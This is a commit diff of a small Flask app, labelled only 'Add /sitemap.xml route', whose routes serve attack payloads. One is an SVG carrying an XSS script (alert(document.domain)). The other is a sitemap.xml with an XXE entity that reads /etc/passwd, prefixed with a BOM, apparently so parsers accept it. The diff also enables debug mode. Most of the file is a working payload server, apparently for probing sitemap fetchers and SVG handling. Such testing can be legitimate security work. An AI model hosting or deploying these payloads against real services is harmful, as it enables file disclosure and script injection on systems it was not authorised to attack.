20ea11912a9d96ef99970802ea5d8a2c378d45f2
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:19:58 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -1,37 +1,38 @@
-from flask import Flask, Response as FlaskResponse
-from fastapi import FastAPI
-from starlette.middleware.wsgi import WSGIMiddleware
-from fastapi.responses import Response as FastResponse
+from flask import Flask, Response
 
-flask_app = Flask(__name__)
+app = Flask(__name__)
 
-@flask_app.route("/")
+@app.route("/")
 def home():
     return "Hello, World!"
 
-@flask_app.route("/svg")
+@app.route("/svg")
 def svg():
-    svg_content = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
-    return FlaskResponse(svg_content, mimetype="image/svg+xml")
+    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>alert(document.domain)</script>
+</svg>"""
+    return Response(svg_content, mimetype="image/svg+xml")
 
-app = FastAPI()
-app.mount("/", WSGIMiddleware(flask_app))
-
-@app.get("/sitemap.xml")
+@app.route("/sitemap.xml")
 def sitemap():
+    # thêm BOM (\xEF\xBB\xBF) + newline trước XML
     xml_bytes = (
-        b'\xEF\xBB\xBF'
-        b'<?xml version="1.0" encoding="UTF-8"?>\n'
-        b'<!DOCTYPE urlset [\n'
-        b'    <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
-        b']>\n'
-        b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
-        b'  <url>\n'
-        b'    <loc>https://example.com/?abc=&xxe;</loc>\n'
-        b'    <lastmod>2025-07-30</lastmod>\n'
-        b'    <changefreq>daily</changefreq>\n'
-        b'    <priority>1.0</priority>\n'
-        b'  </url>\n'
-        b'</urlset>'
+        b"\xEF\xBB\xBF\n"
+        b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+        b"<!DOCTYPE urlset [\n"
+        b"    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+        b"]>\n"
+        b"<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n"
+        b"  <url>\n"
+        b"    <loc>https://example.com/?abc=&xxe;</loc>\n"
+        b"    <lastmod>2025-07-30</lastmod>\n"
+        b"    <changefreq>daily</changefreq>\n"
+        b"    <priority>1.0</priority>\n"
+        b"  </url>\n"
+        b"</urlset>"
     )
-    return FastResponse(content=xml_bytes, media_type="application/xml")
+    return Response(xml_bytes, content_type="application/xml; charset=utf-8")
+
+if __name__ == "__main__":
+    app.run(debug=True)
